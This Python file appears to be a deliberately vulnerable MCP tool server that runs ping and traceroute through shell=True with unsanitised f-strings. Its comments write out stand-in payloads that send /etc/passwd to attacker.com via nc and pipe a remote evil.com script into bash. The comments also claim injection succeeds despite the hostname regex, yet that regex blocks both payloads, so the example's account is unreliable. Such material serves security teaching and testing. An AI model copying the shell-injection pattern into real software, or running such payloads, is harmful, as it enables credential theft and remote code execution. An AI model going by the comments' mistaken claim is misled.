"""Example 3: Complex Shell Injection with Network Diagnostics"""
from mcp import FastMCP
import subprocess
import re

app = FastMCP("injection-attacks-service-3")

class NetworkDiagnostics:
    """Performs network diagnostic operations"""
    
    @staticmethod
    def validate_hostname(hostname: str) -> bool:
        # Weak validation - only checks basic format
        pattern = r'^[a-zA-Z0-9\.\-]+$'
        return bool(re.match(pattern, hostname))
    
    @staticmethod
    def ping(hostname: str, count: int = 4, timeout: int = 5) -> dict:
        # Build ping command
        cmd = f"ping -c {count} -W {timeout} {hostname}"
        
        # VULNERABLE: Shell injection through hostname parameter
        result = subprocess.run(cmd, shell=True, capture_output=True, 
                              text=True, timeout=30)
        
        return {
            "stdout": result.stdout,
            "stderr": result.stderr,
            "returncode": result.returncode
        }
    
    @staticmethod
    def traceroute(hostname: str, max_hops: int = 30) -> dict:
        # VULNERABLE: Another injection point
        cmd = f"traceroute -m {max_hops} {hostname}"
        result = subprocess.run(cmd, shell=True, capture_output=True, 
                              text=True, timeout=60)
        
        return {
            "stdout": result.stdout,
            "returncode": result.returncode
        }

@app.tool()
def ping_host(hostname: str, 
             count: int = 4,
             timeout: int = 5,
             include_traceroute: bool = False) -> str:
    """
    Ping a host to check network connectivity with optional traceroute.
    """
    diag = NetworkDiagnostics()
    
    # Weak validation
    if not diag.validate_hostname(hostname):
        return "Invalid hostname format"
    
    # VULNERABLE: Command injection possible despite validation
    # User can inject: "google.com; cat /etc/passwd | nc attacker.com 4444"
    # Or: "google.com && curl https://evil.com/shell.sh | bash"
    ping_result = diag.ping(hostname, count, timeout)
    
    output = f"Ping results for {hostname}:\n"
    output += f"Packets sent: {count}\n"
    
    if ping_result["returncode"] == 0:
        output += "Host is reachable\n"
    else:
        output += "Host is unreachable\n"
    
    # VULNERABLE: Additional injection point
    if include_traceroute:
        trace_result = diag.traceroute(hostname)
        output += f"\nTraceroute completed with {trace_result['returncode']} status"
    
    return output
